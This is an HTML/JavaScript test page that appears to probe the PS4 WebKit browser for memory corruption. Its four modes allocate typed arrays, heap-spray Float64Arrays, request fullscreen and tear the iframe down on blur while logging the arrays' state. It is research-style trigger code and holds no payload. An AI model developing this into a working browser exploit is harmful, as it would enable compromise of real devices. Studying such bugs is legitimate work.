<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Fullscreen Blur TypedArray Matrix</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; margin:4px; }
</style>
</head>

<body>
<h2>PS4 WebKit – Fullscreen + Blur Corruption Matrix</h2>

<button onclick="startTest('A')">TEST A (no buffer / no array)</button>
<button onclick="startTest('B')">TEST B (ArrayBuffer only)</button>
<button onclick="startTest('C')">TEST C (Float64Array only)</button>
<button onclick="startTest('D')">TEST D (Buffer + Float64Array)</button>

<pre id="log"></pre>

<script>
function log(m){ document.getElementById("log").textContent += m + "\n"; }

function startTest(mode){
    log("\n=== START TEST " + mode + " ===");

    const iframe = document.createElement("iframe");
    iframe.style.width = "100%";
    iframe.style.height = "300px";
    document.body.appendChild(iframe);

    const doc = iframe.contentDocument;

    doc.open();
    doc.write(`
<!DOCTYPE html>
<html>
<body>
<script>
let buffer = null;
let f64 = null;
let spray = [];

function l(m){ parent.postMessage(m, "*"); }

l("[IFRAME] Loaded");
l("[MODE] ${mode}");

/* =========================
   STEP 1 – ALLOCATION
========================= */

if("${mode}" === "B" || "${mode}" === "D"){
    buffer = new ArrayBuffer(64);
    l("[ALLOC] ArrayBuffer 64 bytes");
}

if("${mode}" === "C" || "${mode}" === "D"){
    if(!buffer) buffer = new ArrayBuffer(64);
    f64 = new Float64Array(buffer);
    f64[0] = 13.37;
    l("[ALLOC] Float64Array length=" + f64.length);
}

/* keep memory pressure realistic */
if(f64){
    for(let i=0;i<500;i++){
        spray.push(new Float64Array(8));
    }
    l("[SPRAY] Extra Float64Arrays kept alive");
}

/* =========================
   STEP 2 – FULLSCREEN
========================= */

document.documentElement.webkitRequestFullscreen();
l("[STATE] Fullscreen requested");

/* =========================
   STEP 3 – BLUR HANDLER
========================= */

window.onblur = function(){
    l("[EVENT] blur detected");

    l("[STATE] Pre-teardown snapshot:");
    try{
        l("  buffer.byteLength = " + (buffer ? buffer.byteLength : "null"));
        l("  f64.length = " + (f64 ? f64.length : "null"));
        l("  f64[0] = " + (f64 ? f64[0] : "null"));
    }catch(e){
        l("  read exception");
    }

    /* =========================
       STEP 4 – TEARDOWN
    ========================= */

    l("[TEARDOWN] document.write iframe");
    document.write("<h1>TEARDOWN</h1>");
};
<\/script>
</body>
</html>
    `);
    doc.close();
}

/* =========================
   PARENT LOGGER
========================= */
window.addEventListener("message", e=>{
    log(e.data);
});
</script>
</body>
</html>
